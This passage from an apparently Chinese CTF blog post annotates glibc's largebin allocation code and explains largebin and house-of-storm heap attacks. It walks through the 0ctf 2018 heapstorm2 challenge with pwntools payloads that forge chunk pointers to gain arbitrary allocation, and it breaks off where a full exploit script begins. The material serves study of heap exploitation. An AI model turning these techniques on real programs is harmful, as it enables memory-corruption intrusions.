class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span> &lt; chunksize_nomask (fwd))</span><br><span class="line">                       &#123;</span><br><span class="line">                         fwd = fwd-&gt;fd_nextsize;			<span class="comment">//取下一个</span></span><br><span class="line">		  									assert (chunk_main_arena (fwd));<span class="comment">//检查分配区</span></span><br><span class="line">                       &#125;</span><br><span class="line">										</span><br><span class="line">                     <span class="comment">//如果找到了跟他想等的</span></span><br><span class="line">                     <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) <span class="built_in">size</span></span><br><span class="line">		  								== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                       <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                       fwd = fwd-&gt;fd;<span class="comment">//直接将victim插入他的后面（通过fd），不修改nextsize指针。</span></span><br><span class="line">                     </span><br><span class="line">                     <span class="comment">//如果大小不一样(即此时fwd是相邻的大于victim的chunk)</span></span><br><span class="line">                     <span class="comment">//需要构造nextsize双向链表，构造新节点,victim作为堆头</span></span><br><span class="line">                     <span class="keyword">else</span></span><br><span class="line">                       &#123;</span><br><span class="line">                         <span class="comment">//比victim小的指向fwd</span></span><br><span class="line">                         <span class="comment">//比victim大的指向fwd的bk_nextsize（比fwd大的那个）</span></span><br><span class="line">                         <span class="comment">//相当于插入了fwd与fwd-&gt;bk_nextsize之间</span></span><br><span class="line">                         victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                         </span><br><span class="line">                         <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))<span class="comment">//检查size链完整性</span></span><br><span class="line">                           malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (nextsize)"</span>);</span><br><span class="line">                         <span class="comment">//对应的去改fwd的相关指针成链</span></span><br><span class="line">                         fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                         <span class="comment">//插入完成</span></span><br><span class="line">                       &#125;</span><br><span class="line">                      </span><br><span class="line">                     bck = fwd-&gt;bk;</span><br><span class="line">                     <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">                       malloc_printerr (<span class="string">"malloc(): largebin double linked list corrupted (bk)"</span>);</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">             <span class="keyword">else</span></span><br><span class="line">               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<span class="comment">//此时victim为唯一的chunk，也要做循环链表</span></span><br><span class="line">           &#125;</span><br><span class="line">				<span class="comment">//放到对应的 bin 中，构成 bk&lt;--&gt;victim&lt;--&gt;fwd。</span></span><br><span class="line">         mark_bin (av, victim_index);	<span class="comment">//标识bitmap</span></span><br><span class="line">         victim-&gt;bk = bck;</span><br><span class="line">         victim-&gt;fd = fwd;</span><br><span class="line">         fwd-&gt;bk = victim;</span><br><span class="line">         bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<p>贴一下插入过程大佬的总结：</p>
<ol>
<li>找到当前要插入的chunk对应的largebin的index，并定位该index中的最小的chunk<code>bck</code>和最大的chunk<code>fwd</code>。</li>
<li>如果<code>fwd</code>等于<code>bck</code>，表明当前链表为空，则直接将该chunk插入，并设置该chunk为该大小堆块的堆头，将<code>bk_nextsize</code>和<code>fd_nextsize</code>赋值为它本身。</li>
<li>如果<code>fwd</code>不等于<code>bck</code>，表明当前链表已经存在chunk，要做的就是找到当前chunk对应的位置将其插入。首先判断其大小是否小于最小chunk的size，<code>(size) &lt; (bck-&gt;bk-&gt;size)</code>，如果小于则说明该chunk为当前链表中最小的chunk，即插入位置在链表末尾，无需遍历链表，直接插入到链表的末尾，且该chunk没有对应的堆头，设置该chunk为相应堆大小堆的堆头，将<code>bk_nextsize</code>指向比它大的堆头，<code>fd_nextsize</code>指向双链表的第一个节点即最大的堆头。</li>
<li>如果当前chunk的size不是最小的chunk，则从双链表的第一个节点即最大的chunk的堆头开始遍历，通过<code>fd_nextsize</code>进行遍历，由于<code>fd_nextsize</code>指向的是比当前堆头小的堆头，因此可以加快遍历速度。直到找到小于等于要插入的chunk的size。</li>
<li>如果找到的chunk的size等于要插入chunk的size，则说明当前要插入的chunk的size已经存在堆头，那么只需将该chunk插入到堆头的下一个节点。</li>
<li>如果找到的chunk的size小于当前要插入chunk的size，则说明当前插入的chunk不存在堆头，因此该chunk会成为堆头插入到该位置，设置<code>fd_nextsize</code>与<code>bk_nextsize</code>。</li>
</ol>
<h3 id="largebin的取出相关操作"><a href="#largebin的取出相关操作" class="headerlink" title="largebin的取出相关操作"></a>largebin的取出相关操作</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))<span class="comment">//如果不在samllbin大小中</span></span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx); <span class="comment">//找到申请的size对应的largebin链表</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;					<span class="comment">//此时victim为链表的第一个节点</span></span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;<span class="built_in">size</span>) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)) <span class="comment">//第一步，判断链表的第一个结点，即最大的chunk是否大于要申请的size</span></span><br><span class="line">            &#123;</span><br><span class="line">            	<span class="comment">//进入这里时，已经确定链表第一个节点——即最大的chunk大于要申请的size，那么我们就应该从这一条链中取，问题就是取这一条链上的哪一个？</span></span><br><span class="line">              victim = victim-&gt;bk_nextsize; <span class="comment">//本来victim是链中最大的那个，现在我们要从小往遍历，那么victim-&gt;bk_nextsize就循环回了链中最小的那个</span></span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span> = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))) <span class="comment">//第二步，从最小的chunk开始，反向遍历 chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环</span></span><br><span class="line">                victim = victim-&gt;bk_nextsize;<span class="comment">//victim取相邻的更大size的chunk </span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;<span class="built_in">size</span> == victim-&gt;fd-&gt;<span class="built_in">size</span>) <span class="comment">//第三步，申请的chunk对应的chunk存在多个结点，则申请相应堆头的下个结点，不申请堆头。</span></span><br><span class="line">                victim = victim-&gt;fd;			<span class="comment">//出现相同大小时堆头作为次优先申请</span></span><br><span class="line"></span><br><span class="line">              remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd); <span class="comment">//第四步，largebin unlink 操作</span></span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE) <span class="comment">//第五步，如果剩余的空间小于MINSIZE，则将该空间直接给用户</span></span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, <span class="built_in">size</span>);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;<span class="built_in">size</span> |= NON_MAIN_ARENA;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = chunk_at_offset (victim, nb); <span class="comment">//第六步，如果当前剩余空间还可以构成chunk，则将剩余的空间放入到unsorted bin中（切割后）。</span></span><br><span class="line">                </span><br><span class="line">                  <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                  bck = unsorted_chunks (av);<span class="comment">//bck是ub头</span></span><br><span class="line">                  fwd = bck-&gt;fd;						 <span class="comment">//fwd是ub第一个chunk</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                    &#123;</span><br><span class="line">                      errstr = <span class="string">"malloc(): corrupted unsorted chunks"</span>;</span><br><span class="line">                      <span class="keyword">goto</span> errout;</span><br><span class="line">                    &#125;</span><br><span class="line">                  remainder-&gt;bk = bck;</span><br><span class="line">                  remainder-&gt;fd = fwd;</span><br><span class="line">                  bck-&gt;fd = remainder;</span><br><span class="line">                  fwd-&gt;bk = remainder;</span><br><span class="line">                <span class="comment">//以上操作完成后lastremainder被插入ub，成为新的链首元素</span></span><br><span class="line">                <span class="comment">//如果不在smallbin范围，那么nextsize指针置空</span></span><br><span class="line">                  <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                    &#123;</span><br><span class="line">                      remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                      remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                </span><br><span class="line">                  set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                  set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                  set_foot (remainder, remainder_size);</span><br><span class="line">                &#125;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>贴一下申请过程大佬的总结：</p>
<ol>
<li>找到当前要申请的空间对应的largebin链表，判断第一个结点即最大结点的大小是否大于要申请的空间，如果小于则说明largebin中没有合适的堆块，需采用其他分配方式。</li>
<li>如果当前largebin中存在合适的堆块，则从最小堆块开始，通过<code>bk_nextsize</code>反向遍历链表，找到大于等于当前申请空间的结点。</li>
<li>为减少操作，判断找到的相应结点（堆头）的下个结点是否是相同大小的堆块，如果是的话，将目标设置为该堆头的第二个结点，以此减少将<code>fd_nextsize</code>与<code>bk_nextsize</code>赋值的操作。</li>
<li>调用<code>unlink</code>将目标largebin chunk从双链表中取下。</li>
<li>判断剩余空间是否小于MINSIZE，如果小于直接返回给用户。</li>
<li>否则将剩余的空间构成新的chunk放入到unsorted bin中。</li>
</ol>
<h2 id="伪造Largebin的bk-nextsize（取出时）"><a href="#伪造Largebin的bk-nextsize（取出时）" class="headerlink" title="伪造Largebin的bk_nextsize（取出时）"></a>伪造Largebin的bk_nextsize（取出时）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (victim-&gt;<span class="built_in">size</span>) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)) <span class="comment">//判断链表的第一个结点，即最大的chunk是否大于要申请的size</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize; </span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (<span class="built_in">size</span> = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))) <span class="comment">//从最小的chunk开始，反向遍历 chunk size链表，直到找到第一个大于等于所需chunk大小的chunk退出循环</span></span><br><span class="line">                victim = victim-&gt;bk_nextsize;  <span class="comment">//漏洞点，伪造bk_nextsize</span></span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;<span class="built_in">size</span> == victim-&gt;fd-&gt;<span class="built_in">size</span>) <span class="comment">//申请的chunk对应的chunk存在多个结点，则申请相应堆头的下个结点，不申请堆头。</span></span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = <span class="built_in">size</span> - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd); <span class="comment">//largebin unlink 操作</span></span><br><span class="line"></span><br><span class="line">            ... </span><br><span class="line">            <span class="keyword">return</span> p;</span><br></pre></td></tr></table></figure>

<p><strong>当利用bk_nextsize反向遍历双链表时，如果我们可以伪造堆头节点的bk_nextsize，让其指向一个evil内存地址，然后我们 在evil_addr上构造了相应的数据以通过unlink，会将该空间返回申请到非预期的内存</strong></p>
<p><strong>绕过unlink最简单 的就是fd与bk按照smallbin的unlink方式设置，然后两个nextsize指针都为null</strong></p>
<p>下面贴上大佬的解释：</p>
<p><em>问题出现在通过<code>bk_nextsize</code>反向遍历双链表的过程，如果能够伪造某个堆头结点中的<code>bk_nextsize</code>，将其指向非预期的内存地址，构造好数据使得非预期内存地址在通过unlink的检查之后，会将该空间返回给用户，最终使得可以申请出非预期的内存。最常见的就是用它来构造overlap chunk。</em></p>
<p><em>至于绕过<code>unlink</code>的检查，我认为最好的方式就是伪造的内存空间将<code>fd</code>与<code>bk</code>按照smallbin<code>unlink</code>的利用方式设置，而将<code>bk_nextsize</code>和<code>fd_nextsize</code>设置成0，这样就不会对这两个字段进行操作了。</em></p>
<p><em>典型的应用场景为：存在四个堆ABCD，largebin中存在链表A-&gt;B，其中A为0x420，B为0x400，C为0x410，C未释放。将B的<code>bk_nextsize</code>伪造指向C，同时将C的<code>fd</code>与<code>bk</code>构造好，将C的<code>fd_nextsize</code>与<code>bk_nextsize</code>赋值为0，当再次申请0x410大小的内存E时，遍历<code>B-&gt;bk_nextsize</code>会指向C，且C的大小满足需求，因此会调用unlink将C从双链表取下，因此申请出来的堆块E的地址会为C的地址，即E和C为同一内存块，实现overlap chunk的构造。</em></p>
<h2 id="伪造largebin的bk-nextsize以及bk（插入largebin时）"><a href="#伪造largebin的bk-nextsize以及bk（插入largebin时）" class="headerlink" title="伪造largebin的bk_nextsize以及bk（插入largebin时）"></a>伪造largebin的bk_nextsize以及bk（插入largebin时）</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">...<span class="comment">//将largebin从unsorted bin中取下</span></span><br><span class="line">       unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">       bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line">         </span><br><span class="line">     </span><br><span class="line">			  <span class="comment">//如果大小不一样(即此时fwd是相邻的大于victim的chunk)</span></span><br><span class="line">                  	 <span class="comment">//需要构造nextsize双向链表，构造新节点,victim作为堆头</span></span><br><span class="line">                      <span class="comment">//否则这个chunk将会成为堆头，`bk_nextsize`和`fd_nextsize`将被置位</span></span><br><span class="line">                       <span class="comment">//比victim小的指向fwd（fd_nextsize）</span></span><br><span class="line">                       <span class="comment">//比victim大的指向fwd的bk_nextsize（比fwd大的那个）</span></span><br><span class="line">                       <span class="comment">//相当于插入了fwd与fwd-&gt;bk_nextsize之间</span></span><br><span class="line">                       victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                       victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; <span class="comment">//由于fwd-&gt;bk_nextsize可控，因此victim-&gt;bk_nextsize可控</span></span><br><span class="line">                       fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                       victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; <span class="comment">//victim-&gt;bk_nextsize可控，因此实现了往任意地址写victim的能力</span></span><br><span class="line">                     &#125;</span><br><span class="line">                   bck = fwd-&gt;bk; <span class="comment">//由于fwd-&gt;bk可控，因此bck可控</span></span><br><span class="line">              ...</span><br><span class="line"></span><br><span class="line">       mark_bin (av, victim_index);</span><br><span class="line">       <span class="comment">//设置fd与bk完成插入</span></span><br><span class="line">       victim-&gt;bk = bck; </span><br><span class="line">       victim-&gt;fd = fwd;</span><br><span class="line">       fwd-&gt;bk = victim;</span><br><span class="line">       bck-&gt;fd = victim; <span class="comment">//bck可控，因此实现了往任意地址写victim的能力</span></span><br><span class="line">       ...</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<h1 id="例题1：0ctf-2018-heapstorm2（插入时攻击）"><a href="#例题1：0ctf-2018-heapstorm2（插入时攻击）" class="headerlink" title="例题1：0ctf_2018_heapstorm2（插入时攻击）"></a>例题1：0ctf_2018_heapstorm2（插入时攻击）</h1><p><em>本题是典型的house of storm，可以做一个任意写+一个任意申请，威力还是相当给力的。</em></p>
<h2 id="题目概览"><a href="#题目概览" class="headerlink" title="题目概览"></a>题目概览</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !mallopt(<span class="number">1</span>, <span class="number">0</span>) )</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br></pre></td></tr></table></figure>

<p><code>mallopt(M_MXFAST,0)</code>将<code>global_max_fast</code>设置为0,这个值的意思是最大为多大的chunk归fastbin管理,设置为0表示这个程序中不再存在fastbin。即本程序禁用了fastbin。</p>
<p><img src="https://s1.ax1x.com/2020/08/25/d2Zmvt.png" alt></p>
<p>在edit函数中有一个<strong>off-by-null</strong></p>
<p><img src="https://s1.ax1x.com/2020/08/25/d2eTTU.png" alt></p>
<p>剩下的就是一个常用的uaf。</p>
<h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>首先我们造两个overlap到unsortedbin里。(overlap的过程我就先不说了，可以做前向合并可以做后向合并)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unsortbin: <span class="number">0x100203060</span> (<span class="built_in">size</span> : <span class="number">0x4f0</span>) &lt;--&gt; <span class="number">0x1002035c0</span> (<span class="built_in">size</span> : <span class="number">0x4e0</span>)</span><br></pre></td></tr></table></figure>

<p>然后我们add（0x4e8），从unsortedbin的尾部向前遍历，将size为0x4e0的放入largebin，返回size为0x4f0的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">   unsortbin: <span class="number">0x0</span></span><br><span class="line">largebin[ <span class="number">3</span>]: <span class="number">0x1002035c0</span> (<span class="built_in">size</span> : <span class="number">0x4e0</span>)</span><br></pre></td></tr></table></figure>

<p>然后再把0x4e8的放进unsortedbin</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">   unsortbin: <span class="number">0x100203060</span> (<span class="built_in">size</span> : <span class="number">0x4f0</span>)</span><br><span class="line">largebin[ <span class="number">3</span>]: <span class="number">0x1002035c0</span> (<span class="built_in">size</span> : <span class="number">0x4e0</span>)</span><br></pre></td></tr></table></figure>

<p>此时largebin中的chunk是大于unsortedbin中的chunk的，那么fwd此时就应该指向0x1002035c0这一个chunk，victim是unsortedbin中的chunk。</p>
<p>我们再进行如下操作：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">storge = <span class="number">0x13370800</span></span><br><span class="line">fake_chunk = storge<span class="number">-0x20</span></span><br><span class="line">p1 = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x4f1</span>)+p64(<span class="number">0</span>)+p64(fake_chunk)</span><br><span class="line">edit(<span class="number">7</span>,p1)                  <span class="comment"># 劫持unsortfbin中chunk的bk指针指向fakechunk</span></span><br><span class="line"></span><br><span class="line">p2 = p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4e1</span>)</span><br><span class="line">p2 += p64(<span class="number">0</span>)+p64(fake_chunk+<span class="number">8</span>)          <span class="comment"># 劫持在largebin中chunk的bk指针避免unlink时崩溃</span></span><br><span class="line">p2 +=  p64(<span class="number">0</span>)+p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)    <span class="comment"># 劫持在largebin中chunk的bk_nextsize指针</span></span><br><span class="line">edit(<span class="number">8</span>,p2)</span><br></pre></td></tr></table></figure>

<hr>
<p><strong>此时unsortedbin中的chunk的bk指针被劫持指向我们的fakechunk，如果我们再add（0x48）时，程序首先在fastbin和smallbin中找空闲的chunk，但是没有，于是去unsortedbin中找，第一次找到大小为0x4f0的，这个大小肯定是不对的，但是检测到unsortedbin中还有一个chunk（即我们劫持bk指针后指向的fakechunk）并不会对大小为0x4f0的chunk做切割，而是直接做sorted，即插入largebin（此时触发largebin attack给fakechunk写上一个size）。然后系统顺着我们劫持的bk指针找，找到了我们的fakechunk，此时的fakechunk是有size的，然后系统去检验他的size，发现除去标志位刚好是0x50，那么就把fake chunk返回给我们。</strong></p>
<hr>
<p><img src="https://s1.ax1x.com/2020/08/29/dTXFk4.png" alt></p>
<p>然后add一次0x48（由于calloc的检查，此处被错位写上去的size必须要是0x56，多爆破几次）</p>
<p>除去标志位0x56就是0x50了，我们申请0x48，会返回这个fake_chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x48</span>)       <span class="comment"># 2,largebin attack触发</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2020/08/27/df6jaR.png" alt></p>
<p>然后我们写一个while爆破一下:</p>
<p><img src="https://s1.ax1x.com/2020/08/27/dfgklT.png" alt></p>
<p>可以看到此时爆破成功，我们通过修改表中相关内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p3 = p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x13377331</span>)+p64(storage)</span><br><span class="line">edit(<span class="number">2</span>,p3)</span><br></pre></td></tr></table></figure>

<p>来bypass掉show时候的验证：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (chunk_list[<span class="number">1</span>].size ^ chunk_list[<span class="number">1</span>].addr) != <span class="number">0x13377331</span> )</span><br><span class="line">  <span class="keyword">return</span> puts(<span class="string">"Permission denied"</span>);</span><br></pre></td></tr></table></figure>

<p>此时就可以正常使用show了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">s = <span class="keyword">lambda</span> buf: io.send(buf)</span><br><span class="line">sl = <span class="keyword">lambda</span> buf: io.sendline(buf)</span><br><span class="line">sa = <span class="keyword">lambda</span> delim, buf: io.sendafter(delim, buf)</span><br><span class="line">sal = <span class="keyword">lambda</span> delim, buf: io.sendlineafter(delim, buf)</span><br><span class="line">shell = <span 